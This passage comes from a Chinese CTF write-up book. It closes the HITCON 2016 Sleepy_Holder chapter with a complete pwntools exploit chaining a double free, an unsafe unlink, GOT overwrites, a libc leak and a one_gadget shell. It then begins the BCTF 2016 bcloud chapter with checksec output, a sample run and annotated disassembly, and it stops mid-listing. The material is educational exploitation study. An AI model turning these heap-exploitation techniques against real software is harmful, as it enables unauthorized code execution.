0x603560: 0x0000000041414141 0x0000000000000000
gdb-peda$ x/gx 0x006020b8 + 0x18
0x6020d0: 0x0000000000603530 fd->bk = P
gdb-peda$ x/gx 0x006020c0 + 0x10
0x6020d0: 0x0000000000603530 bk->fd = P
释放 big secret 即可触发 unsafe unlink：
1294
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
gdb-peda$ x/6gx 0x006020b8
0x6020b8: 0x0000000000000000 0x0000000000603560
0x6020c8: 0x00007ffff7f92010 0x00000000006020b8  PI:EMAIL
payload += "A" * 8
payload += p64(big_ptr) # small_ptr -> big_ptr
payload += p32(1) # big_flag
renew(1, payload)
renew(2, p64(elf.plt['puts'])) # PI:EMAIL -> puts@plt
renew(1, p64(elf.got['puts'])) # big_ptr -> PI:EMAIL
wipe(2)
puts_addr = u64(io.recvline()[:6] + "\x00\x00")
libc_base = puts_addr - libc.symbols['puts']
one_gadget = libc_base + 0x4525a
log.info("libc base: 0x%x" % libc_base)
log.info("one_gadget address: 0x%x" % one_gadget)
pwn
1295
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
def pwn():
payload = "A" * 0x10
payload += p64(elf.got['puts']) # small_ptr -> PI:EMAIL
renew(1, payload)
renew(1, p64(one_gadget)) # PI:EMAIL -> one_gadget
io.interactive()
开启 ASLR，Bingo!!!
$ python exp.py
[+] Starting local process './SleepyHolder': pid 8352
[*] libc base: 0x7ffbcd987000
[*] one_gadget address: 0x7ffbcd9cc25a
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
io = process(['./SleepyHolder'], env={'LD_PRELOAD':'./libc-2.23.
so'})
elf = ELF('SleepyHolder')
libc = ELF('libc-2.23.so')
small_ptr = 0x006020d0
big_ptr = 0x006020c0
def keep(idx, content):
1296
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
io.sendlineafter("Renew secret\n", '1')
io.sendlineafter("Big secret\n", str(idx))
io.sendafter("secret: \n", content)
def wipe(idx):
io.sendlineafter("Renew secret\n", '2')
io.sendlineafter("Big secret\n", str(idx))
def renew(idx, content):
io.sendlineafter("Renew secret\n", '3')
io.sendlineafter("Big secret\n", str(idx))
io.sendafter("secret: \n", content)
def unlink():
keep(1, "AAAA") # small
keep(2, "AAAA") # big
wipe(1) # put small into fastbins
keep(3, "AAAA") # huge # put small into small bin
wipe(1) # double free # put small into fastbins
payload = p64(0) + p64(0x21) # fake header
payload += p64(small_ptr - 0x18) # fake fd
payload += p64(small_ptr - 0x10) # fake bk
payload += p64(0x20) # fake prev_size
keep(1, payload)
wipe(2) # unsafe unlink
def leak():
global one_gadget
payload = "A" * 8
payload += p64(elf.got['free']) # big_ptr -> PI:EMAIL
payload += "A" * 8
payload += p64(big_ptr) # small_ptr -> big_ptr
payload += p32(1) # big_flag
renew(1, payload)
renew(2, p64(elf.plt['puts'])) # PI:EMAIL -> puts@plt
renew(1, p64(elf.got['puts'])) # big_ptr -> PI:EMAIL
1297
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
wipe(2)
puts_addr = u64(io.recvline()[:6] + "\x00\x00")
libc_base = puts_addr - libc.symbols['puts']
one_gadget = libc_base + 0x4525a
log.info("libc base: 0x%x" % libc_base)
log.info("one_gadget address: 0x%x" % one_gadget)
def pwn():
payload = "A" * 0x10
payload += p64(elf.got['puts']) # small_ptr -> PI:EMAIL
renew(1, payload)
renew(1, p64(one_gadget)) # PI:EMAIL -> one_gadget
io.interactive()
if __name__ == "__main__":
unlink()
leak()
pwn()
参考资料
https://ctftime.org/task/4812
https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHold
er
1298
6.1.23 pwn BCTF2016 bcloud
6.1.23 pwn BCTF2016 bcloud
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file bcloud
bcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)
, dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Li
nux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee0
4e, stripped
$ checksec -f bcloud
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 4 bcloud
$ strings libc-2.19.so | grep "GNU C"
GNU C Library (Ubuntu EGLIBC 2.19-0ubuntu6.7) stable release ver
sion 2.19, by Roland McGrath et al.
Compiled by GNU CC version 4.8.2.
32 位程序，开启了 Canary 和 NX，默认开启 ASLR。
在 Ubuntu-14.04 上玩一下：
$ ./bcloud
Input your name:
AAAA
Hey AAAA! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!
Now let's set synchronization options.
Org:
1299
6.1.23 pwn BCTF2016 bcloud
1234
Host:
4321
OKay! Enjoy:)
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>
1
Input the length of the note content:
10
Input the content:
BBBB
Create success, the id is 0
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>
2
WTF? Something strange happened.
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>
3
Input the id:
0
Input the new content:
CCCC
Edit success.
1.New note
1300
6.1.23 pwn BCTF2016 bcloud
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>
4
Input the id:
0
Delete success.
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>
5
Syncing...
Synchronization success.
典型的堆利用程序，实现了添加、修改、删除的功能，显示功能未实现。另外还有
个同步，不知道做什么用。在打印菜单之前，程序读入 name 并打印了出来，这个
很有意思，可能是为了信息泄漏故意设置的。
题目解析
init
在 main 函数打印菜单之前，有一个初始化函数 fcn.0804899c ，这个函数又依
次调用了函数 sub.memset_7a1 和函数 sub.memset_84e ：
[0x08048590]> pdf @ sub.memset_7a1
/ (fcn) sub.memset_7a1 173
| sub.memset_7a1 ();
| ; var int local_60h @ ebp-0x60
| ; var int local_5ch @ ebp-0x5c
| ; var int local_ch @ ebp-0xc
1301
6.1.23 pwn BCTF2016 bcloud
| ; var int local_4h @ esp+0x4
| ; var int local_8h @ esp+0x8
| ; CALL XREF from 0x080489a2 (fcn.0804899c)
| 0x080487a1 push ebp
| 0x080487a2 mov ebp, esp
| 0x080487a4 sub esp, 0x78
; 开辟栈空间
| 0x080487a7 mov eax, dword gs:[0x14]
; [0x14:4]=-1 ; 20
| 0x080487ad mov dword [local_ch], eax
| 0x080487b0 xor eax, eax
| 0x080487b2 lea eax, [local_5ch]
; eax = local_5ch
| 0x080487b5 add eax, 0x40
; eax = local_5ch + 0x40
| 0x080487b8 mov dword [local_60h], eax
; [local_60h] = local_5ch + 0x40
| 0x080487bb mov dword [local_8h], 0x50
; 'P' ; [0x50:4]=-1 ; 80
| 0x080487c3 mov dword [local_4h], 0
| 0x080487cb lea eax, [local_5ch]
| 0x080487ce mov dword [esp], eax
| 0x080487d1 call sym.imp.memset
; memset(local_5ch, 0, 0x50) 初始化内存
| 0x080487d6 mov dword [esp], str.Input_your_name
: ; [0x8048e87:4]=0x75706e49 ; "Input your name:"
| 0x080487dd call sym.imp.puts
; int puts(const char *s)
| 0x080487e2 mov dword [local_8h], 0xa
| 0x080487ea mov dword [local_4h], 0x40
; '@' ; [0x40:4]=-1 ; 64
| 0x080487f2 lea eax, [local_5ch]
| 0x080487f5 mov dword [esp], eax
| 0x080487f8 call sub.read_68d
; read_68d(local_5ch, 0x40, 0xa) 调用函数读入 0x40 个字节
到栈
| 0x080487fd mov dword [esp], 0x40
; '@' ; [0x40:4]=-1 ; 64
| 0x08048804 call sym.imp.malloc
; malloc(0x40) 分配空间
1302
6.1.23 pwn BCTF2016 bcloud
| 0x08048809 mov edx, eax
| 0x0804880b mov eax, dword [local_60h]
; eax = local_5ch + 0x40
| 0x0804880e mov dword [eax], edx
; 将返回地址放到 [local_5ch + 0x40]，该地址位于栈上
| 0x08048810 mov eax, dword [local_60h]
| 0x08048813 mov eax, dword [eax]
| 0x08048815 mov dword [0x804b0cc], eax
; 将返回地址放到 [0x804b0cc]，该地址位于 .bss 段
| 0x0804881a mov eax, dword [local_60h]
| 0x0804881d mov eax, dword [eax]
| 0x0804881f lea edx, [local_5ch]
| 0x08048822 mov dword [local_4h], edx
| 0x08048826 mov dword [esp], eax
; [esp] 为返回地址
| 0x08048829 call sym.imp.strcpy
; strcpy([esp], local_5ch) 将读入的字符串复制到分配的空间上
| 0x0804882e mov eax, dword [local_60h]
| 0x08048831 mov eax, dword [eax]
| 0x08048833 mov dword [esp], eax
| 0x08048836 call sub.Hey__s__Welcome_to_BCTF_CLO
UD_NOTE_MANAGE_SYSTEM_779 ; 调用函数打印出字符串
| 0x0804883b mov eax, dword [local_ch]